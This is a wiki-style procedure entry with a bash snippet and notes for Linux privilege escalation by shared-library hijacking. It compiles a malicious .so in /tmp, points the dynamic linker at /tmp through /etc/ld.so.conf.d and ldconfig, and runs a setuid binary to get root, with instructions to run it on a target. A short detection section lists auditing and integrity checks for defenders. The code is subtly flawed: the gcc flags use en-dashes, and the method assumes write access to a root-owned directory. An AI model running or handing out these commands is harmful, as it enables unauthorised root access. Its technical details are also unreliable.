---
type: code
language: bash
verified: true
created_at: '2023-04-06T03:56:19.370394+00:00'
updated_at: '2023-04-10T20:34:33.741242+00:00'
platforms:
  - Linux
tags:
  - privilege-escalation
  - library-hijack
validated: true
---

# Compile-and-Load-Malicious-Shared-Library

## Code

```bash
gcc –Wall –fPIC –shared –o vulnlib.so /tmp/vulnlib.c
echo "/tmp/" > /etc/ld.so.conf.d/exploit.conf && ldconfig -l /tmp/vulnlib.so
/opt/binary
```

## Description

This bash code snippet compiles a C source file into a malicious shared library (.so), configures the dynamic linker's search path to prioritize the attacker's directory via ld.so.conf.d, caches the change with ldconfig, and executes the vulnerable binary to trigger the load. It is used in Linux privilege escalation to hijack library loading in setuid binaries, executing arbitrary code (defined in vulnlib.c) with elevated privileges.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| /tmp/vulnlib.c | Path to the malicious C source file containing the payload (e.g., root shell constructor) | /tmp/vulnlib.c |
| vulnlib.so | Output name of the compiled shared library, matching a dependency from ldd | vulnlib.so |
| /etc/ld.so.conf.d/exploit.conf | Configuration file to add the custom search path | /etc/ld.so.conf.d/exploit.conf |
| /opt/binary | Path to the vulnerable setuid binary that depends on the hijacked library | /opt/binary |

## Usage

This code is executed after identifying dependencies (via ldd) and creating the source file. Run it in a low-privilege shell on the target. It assumes write access to /tmp and /etc/ld.so.conf.d. After execution, the binary loads the malicious .so, running the payload. Use in post-exploitation scenarios for root access.

## Detection

- Monitor gcc compilations of .so files in /tmp via process auditing (e.g., auditd rules on execve for gcc).
- Watch for modifications to /etc/ld.so.conf.d files and ldconfig invocations in logs (/var/log/secure or audit logs).
- Detect anomalous library loads in strace output of setuid binaries or via lsof for unexpected .so paths.
- Integrity checks on system libraries using rpm -V or debsums.

## Related

- [[procedures/Linux-Privilege-Escalation-via-Shared-Library-Dependencies]]
